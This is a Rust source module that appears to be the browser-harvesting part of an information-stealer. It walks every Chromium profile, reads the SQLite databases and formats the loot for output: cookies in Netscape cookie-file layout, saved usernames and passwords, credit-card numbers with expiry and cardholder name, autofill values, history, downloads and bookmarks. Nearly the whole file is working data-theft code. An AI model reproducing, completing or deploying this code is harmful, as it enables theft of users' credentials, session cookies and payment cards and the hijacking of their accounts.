#![feature(let_chains)]
#![no_std]

extern crate alloc;
use database::{DatabaseReader, Databases, TableRecord};
pub mod chromium;

use crate::alloc::borrow::ToOwned;
use alloc::string::{String, ToString};

use crate::chromium::ChromiumTask;
use alloc::vec;
use alloc::vec::Vec;
use collector::Collector;
use core::fmt::{Display, Formatter};
use filesystem::path::Path;
use filesystem::{FileSystem, WriteTo};
use tasks::Task;
use tasks::{composite_task, impl_composite_task_runner, CompositeTask};

pub struct BrowsersTask<C: Collector, F: FileSystem> {
    inner: CompositeTask<C, F>,
}

impl<C: Collector + 'static, F: FileSystem + 'static> Default for BrowsersTask<C, F> {
    fn default() -> Self {
        Self {
            inner: composite_task!(ChromiumTask::new()),
        }
    }
}

impl_composite_task_runner!(BrowsersTask<C, F>, "Browsers");

pub(crate) fn collect_and_read_sqlite_from_all_profiles<P, FS, F, R, T, S>(
    profiles: &[Path],
    filesystem: &FS,
    path: P,
    table: S,
    mapper: F,
) -> Option<Vec<T>>
where
    FS: FileSystem,
    P: Fn(&Path) -> R,
    R: AsRef<Path>,
    F: Fn(&dyn TableRecord) -> Option<T>,
    T: Ord,
    S: AsRef<str>,
{
    collect_and_read_from_all_profiles(profiles, Databases::Sqlite, filesystem, path, table, mapper)
}

pub(crate) fn collect_and_read_from_all_profiles<D, FS, P, R, F, T, S>(
    profiles: &[Path],
    db_type: D,
    filesystem: &FS,
    path: P,
    table: S,
    mapper: F,
) -> Option<Vec<T>>
where
    D: AsRef<Databases>,
    FS: FileSystem,
    P: Fn(&Path) -> R,
    R: AsRef<Path>,
    F: Fn(&dyn TableRecord) -> Option<T>,
    T: Ord,
    S: AsRef<str>,
{
    collect_from_all_profiles(profiles, |profile| {
        let db_path = path(profile);

        if !filesystem.is_exists(db_path.as_ref()) {
            None
        } else {
            read_and_map_records(
                &db_type,
                filesystem,
                db_path.as_ref(),
                table.as_ref(),
                &mapper,
            )
        }
    })
}

pub(crate) fn collect_from_all_profiles<F, T>(profiles: &[Path], f: F) -> Option<Vec<T>>
where
    F: Fn(&Path) -> Option<Vec<T>>,
    T: Ord,
{
    let mut data: Vec<T> = profiles
        .iter()
        .filter_map(|profile| f(profile))
        .flat_map(|v| v.into_iter())
        .collect();

    if data.is_empty() {
        None
    } else {
        data.sort();
        data.dedup();

        Some(data)
    }
}

pub(crate) fn to_string_and_write_all<F, T>(
    data: &[T],
    sep: &str,
    filesystem: &F,
    dst: &Path,
) -> Result<(), u32>
where
    T: Display,
    F: FileSystem,
{
    data.iter()
        .map(|it| it.to_string())
        .collect::<Vec<String>>()
        .join(sep)
        .write_to(filesystem, dst)
}

pub(crate) fn read_and_map_records<FS, D, T, F>(
    db_type: D,
    filesystem: &FS,
    path: &Path,
    table_name: &str,
    mapper: F,
) -> Option<Vec<T>>
where
    FS: FileSystem,
    D: AsRef<Databases>,
    F: Fn(&dyn TableRecord) -> Option<T>,
{
    let bytes = filesystem.read_file(path).ok()?;
    let db = db_type.as_ref().read_from_bytes(&bytes).ok()?;
    let table = db.read_table(table_name)?;

    let records = table.filter_map(|record| mapper(&record)).collect();

    Some(records)
}

#[derive(PartialEq, Ord, Eq, PartialOrd)]
pub(crate) struct Cookie {
    pub host_key: String,
    pub name: String,
    pub value: String,
    pub path: String,
    pub expires_utc: i64,
}

impl Display for Cookie {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(
            f,
            "{}\tTRUE\t{}\tFALSE\t{}\t{}\t{}\r",
            self.host_key, self.path, self.expires_utc, self.name, self.value
        )
    }
}

#[derive(PartialEq, Ord, Eq, PartialOrd)]
pub(crate) struct Bookmark {
    pub name: String,
    pub url: String,
}

impl Display for Bookmark {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(
            f,
            "Name: {}\n\
            Url: {}",
            self.name, self.url
        )
    }
}

#[derive(PartialEq, Ord, Eq, PartialOrd)]
pub(crate) struct AutoFill {
    pub name: String,
    pub value: String,
    pub last_used: i64,
}

impl Display for AutoFill {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(
            f,
            "Name: {}\n\
            Value: {}",
            self.name, self.value
        )
    }
}

#[derive(PartialEq, Ord, Eq, PartialOrd)]
pub(crate) struct CreditCard {
    pub name_on_card: String,
    pub expiration_month: i64,
    pub expiration_year: i64,
    pub card_number: String,
    pub use_count: i64,
}

impl Display for CreditCard {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(
            f,
            "Number: {}\n\
            Month/Year: {}/{}\n\
            Name: {}",
            self.card_number, self.expiration_month, self.expiration_year, self.name_on_card
        )
    }
}

#[derive(PartialEq, Ord, Eq, PartialOrd)]
pub(crate) struct Download {
    pub saved_as: String,
    pub url: String,
}

impl Display for Download {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(
            f,
            "Url: {}\n\
            Saved: {}",
            self.url, self.saved_as
        )
    }
}

#[derive(PartialEq, Ord, Eq, PartialOrd)]
pub(crate) struct Password {
    pub origin: Option<String>,
    pub username: Option<String>,
    pub password: Option<String>,
}

impl Display for Password {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(
            f,
            "Origin: {}\n\
            Username: {}\n\
            Password: {}",
            self.origin.as_deref().unwrap_or_default(),
            self.username.as_deref().unwrap_or_default(),
            self.password.as_deref().unwrap_or_default()
        )
    }
}

#[derive(PartialEq, Ord, Eq, PartialOrd)]
pub(crate) struct History {
    pub url: String,
    pub title: String,
    pub last_visit_time: i64,
}

impl Display for History {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(
            f,
            "Title: {}\n\
            Url: {}",
            self.title, self.url,
        )
    }
}
